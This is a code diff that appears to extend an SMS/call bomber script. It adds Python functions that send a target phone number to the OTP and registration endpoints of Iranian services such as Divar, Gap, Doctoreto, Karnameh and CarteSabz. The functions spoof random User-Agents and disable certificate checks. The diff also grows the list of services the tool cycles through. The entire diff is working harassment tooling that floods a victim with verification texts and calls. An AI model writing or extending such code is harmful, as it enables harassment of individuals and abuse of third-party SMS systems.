@@ -692,16 +692,209 @@ def masterkala(phone):
 
 
 
+def khodro45(phone):
+    import requests, random
+    url = "https://khodro45.com/api/v2/customers/otp/"
+    phone = phone.replace("+98", "0")
+    headers = {
+        "Content-Type": "application/json",
+        "User-Agent": f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(90, 120)}.0.{random.randint(1000, 9999)}.{random.randint(100, 999)} Safari/537.36"
+    }
+    try:
+        r = requests.post(url, json={"mobile": phone, "device_type": 2}, headers=headers, timeout=10, verify=False)
+        return r.status_code in [200, 201, 202]
+    except: return False
+
+
+
+def karnameh(phone):
+    import requests, random
+    url = "https://api-gw.karnameh.com/switch/api/auth/otp/send/"
+    phone = phone.replace("+98", "0")
+    headers = {
+        "Content-Type": "application/json",
+        "User-Agent": f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(90, 120)}.0.{random.randint(1000, 9999)}.{random.randint(100, 999)} Safari/537.36"
+    }
+    try:
+        r = requests.post(url, json={"phone_number": phone}, headers=headers, timeout=10, verify=False)
+        return r.status_code in [200, 201, 202]
+    except: return False
+
+
+
+def gap(phone):
+    import requests
+    phone = phone.replace('+', '').replace(' ', '')
+    try:
+        headers = {
+            "Host": "core.gap.im",
+            "x-version": "4.5.7",
+            "appversion": "web",
+            "origin": "https://web.gap.im",
+            "referer": "https://web.gap.im/"
+        }
+        r = requests.get(f"https://core.gap.im/v1/user/add.json?mobile=%2B{phone}", headers=headers, timeout=10, verify=False)
+        return r.status_code == 200 and "OK" in r.text
+    except: return False
+
+
+
+
+def drto(phone):
+    try:
+        formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
+        
+        headers = {
+            "Accept": "application/json",
+            "Content-Type": "application/json", 
+            "app-version": "2.0.0",
+            "User-Agent": random.choice(user_agents),
+        }
+        
+        payload = {
+            "mobile": formatted_phone,
+            "country_id": 205,
+            "captcha": ""
+        }
+        
+        response = requests.post(
+            "https://api.doctoreto.com/api/web/patient/v1/accounts/register",
+            json=payload,
+            headers=headers,
+            timeout=10,
+            verify=False
+        )
+        
+        print(f'{y}[Debug] drto Status: {response.status_code}{a}')
+        print(f'{y}[Debug] drto Response: {response.text}{a}')
+        
+        if response.status_code in [200, 201]:
+            print(f'{g}(drto) sms sent successfully!{a}')
+            return True
+        else:
+            print(f'{r}[-] drto error: {response.status_code}{a}')
+            return False
+            
+    except Exception as e:
+        print(f'{r}[!] drto exception: {e}{a}')
+        return False
+
+
+
+def dgshahr(phone):
+    import requests
+    phone = '0' + phone.split('+98')[-1].split('98')[-1]
+    url = "https://lend-b.dgshahr.com/user/login/"
+    payload = {"phone_number": phone, "source": "google-organic", "campaign": "undefined"}
+    headers = {
+        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
+        "Content-Type": "application/json"
+    }
+    try:
+        return requests.post(url, json=payload, headers=headers, timeout=10).status_code == 200
+    except: return False
+
+
+
+def divar(phone):
+    import requests
+    phone = phone.split('+98')[-1].split('98')[-1]
+    try:
+        r = requests.post("https://api.divar.ir/v5/auth/authenticate", json={"phone": phone}, timeout=10)
+        return r.status_code == 200 and r.json().get("authenticate_response") == "AUTHENTICATION_VERIFICATION_CODE_SENT"
+    except: return False
+
+
+
+def charsooq(phone):
+    import requests, re
+    phone = '0' + re.sub(r'[^0-9]', '', phone.split('+98')[-1].split('98')[-1])
+    url = "https://app.charsooq.com/api/v1/send-otp"
+    headers = {
+        "Content-Type": "application/json",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
+    }
+    try:
+        return requests.post(url, json={"cell_number": phone}, headers=headers, timeout=10).status_code in [200, 201, 202]
+    except: return False
+
+
+
+
+        
+def cartesabz(phone):
+    try:
+        import requests
+        session = requests.Session()
+        home_url = "https://cartesabz.net/"
+        headers = {'User-Agent': 'Mozilla/5.0', 'Accept': '*/*'}
+        session.get(home_url, headers=headers, timeout=10, verify=False)
+
+        url = "https://cartesabz.net/wp-admin/admin-ajax.php"
+        data_call = {'login': phone.replace('+98', '+98'), 'method': 'call', 'action': 'first_login'}
+        headers.update({
+            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+            'X-Requested-With': 'XMLHttpRequest',
+            'Origin': 'https://cartesabz.net',
+            'Referer': home_url
+        })
+
+        r_call = session.post(url, data=data_call, headers=headers, timeout=10, verify=False)
+        print(f"Call Status: {r_call.status_code} | Response: {r_call.text}")
+        if r_call.status_code == 200:
+            print(f"{g}[+] CarteSabz Call: درخواست تماس انجام شد{a}")
+        else:
+            print(f"{y}[-] CarteSabz Call: خطا {r_call.status_code}{a}")
+        data_sms = {'login': phone.replace('+98', '+98'), 'method': 'sms', 'action': 'first_login'}
+        r_sms = session.post(url, data=data_sms, headers=headers, timeout=10, verify=False)
+        print(f"SMS Status: {r_sms.status_code} | Response: {r_sms.text}")
+        if r_sms.status_code == 200:
+            print(f"{g}[+] CarteSabz SMS: کد پیامکی ارسال شد!{a}")
+            return True
+        else:
+            print(f"{y}[-] CarteSabz SMS: خطا {r_sms.status_code}{a}")
+            return False
+
+    except Exception as e:
+        print(f"{r}[!] خطا در CarteSabz: {e}{a}")
+        return False
+
+
+def abantether(phone):
+    import requests, re
+    phone = '0' + phone.split('+98')[-1].split('98')[-1]
+    if not re.match(r"^09\d{9}$", phone): return False
+    try:
+        headers = {
+            "Content-Type": "application/json",
+            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15",
+            "Origin": "https://abantether.com",
+            "Referer": "https://abantether.com/"
+        }
+        r = requests.post("https://api.abantether.com/api/v2/auths/register/phone/send", 
+                          json={"phone_number": phone}, headers=headers, timeout=10)
+        return r.status_code == 200
+    except: return False
+
+
+
 # ==========================
 # لیست سرویس‌ها
 # ==========================
 services = [
-    accounts1606, achareh, activecleaners, alldigitall, alopeyk_safir,
-    arzplus, arzunex, azkivam, azno, basalam,
-    bimeh, bimehland, bimeparsian, bornosmode, chapmatin,
-    darunet, didar24, digikala, ebimename, ibime,
-    padmira, vakiljo, abantether, ubitex, twox, theshoes, tetherland, t4f, sibapp, sheypoor, shahrfarsh, sarmayex, riiha, raheeno, tetherland, Raastin, pinket, pindo, otaghak, ompfinex, okala, masterkala, mek, mydigipay, motorbargh, milli_gold
+    abantether, accounts1606, achareh, activecleaners, alldigitall,
+    alopeyk_safir, alldigitall, ompfinex, arzplus, arzunex,
+    azkivam, azno, basalam, bimeh, bimehland,
+    bimeparsian, bornosmode, cartesabz, chapmatin, charsooq,
+    darunet, dgshahr, didar24, digikala, divar,
+    drto, ebimename, gap, ibime, karnameh,
+    khodro45, masterkala, mek, milli_gold, motorbargh,
+    mydigipay, okala, otaghak, padmira, pinket,
+    pindo, Raastin, raheeno, riiha, sarmayex,
+    shahrfarsh, sheypoor, sibapp, t4f, tetherland,
+    theshoes, twox, ubitex, vakiljo
 ]
+
 
 
 # ==========================
